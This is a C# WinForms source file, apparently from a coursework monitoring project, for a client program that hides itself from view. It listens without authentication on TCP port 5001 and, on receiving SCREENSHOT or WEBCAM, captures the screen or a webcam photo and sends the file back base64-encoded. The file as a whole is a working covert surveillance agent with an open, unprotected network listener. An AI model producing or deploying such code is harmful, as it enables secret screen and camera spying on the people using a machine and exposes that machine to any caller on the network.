using CourseWorkMonitoring.Models;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CourseWorkMonitoring
{
    public partial class Client : Form
    {
        private Thread _listenerThread; // Потік для прослуховування запитів
        private const int Port = 5001; // Порт для підключення
        public Client()
        {
            InitializeComponent();
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;


        }

        private void Form1_Load(object sender, EventArgs e)
        {
            _listenerThread = new Thread(StartListening) { IsBackground = true };
            _listenerThread.Start();
        }

        private void StartListening()
        {
            TcpListener listener = new TcpListener(IPAddress.Any, Port);
            listener.Start();
            LogMessage("Клієнт запущено. Очікування запитів...");

            while (true)
            {
                try
                {
                    var client = listener.AcceptTcpClient();
                    ThreadPool.QueueUserWorkItem(HandleClient, client);
                }
                catch (Exception ex)
                {
                    LogMessage($"Помилка прослуховування: {ex.Message}");
                }
            }
        }

        private void HandleClient(object clientObj)
        {
            using (var client = (TcpClient)clientObj)
            using (var stream = client.GetStream())
            {
                StreamReader reader = new StreamReader(stream, Encoding.UTF8);
                StreamWriter writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true };

                try
                {
                    string command = reader.ReadLine();
                    LogMessage($"Отримано команду: {command}");

                    string saveDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "ClientData");

                    switch (command)
                    {
                        case "SCREENSHOT":
                            Screenshot screenshot = new Screenshot();
                            screenshot.TakeScreenshot(saveDir);
                            SendFile(writer, Path.Combine(saveDir, Directory.GetFiles(saveDir).Last()));
                            break;

                        case "WEBCAM":
                            Webcam webcam = new Webcam();
                            webcam.CapturePhoto(saveDir);
                            Thread.Sleep(1000); // Затримка для збереження фото
                            SendFile(writer, Path.Combine(saveDir, Directory.GetFiles(saveDir).Last()));
                            break;

                        default:
                            writer.WriteLine("UNKNOWN_COMMAND");
                            LogMessage("Невідома команда.");
                            break;
                    }
                }
                catch (Exception ex)
                {
                    LogMessage($"Помилка обробки клієнта: {ex.Message}");
                }
            }
        }

        private void SendFile(StreamWriter writer, string filePath)
        {
            if (File.Exists(filePath))
            {
                writer.WriteLine("START_FILE");
                writer.WriteLine(Path.GetFileName(filePath));
                writer.WriteLine(Convert.ToBase64String(File.ReadAllBytes(filePath))); 
                writer.WriteLine("END_FILE");
                LogMessage($"Відправлено файл: {filePath}");
            }
            else
            {
                writer.WriteLine("FILE_NOT_FOUND");
                LogMessage($"Файл не знайдено: {filePath}");
            }
        }

        private void LogMessage(string message)
        {
            Invoke((Action)(() =>
            {
                Console.WriteLine(message);
            }));
        }
    }
}
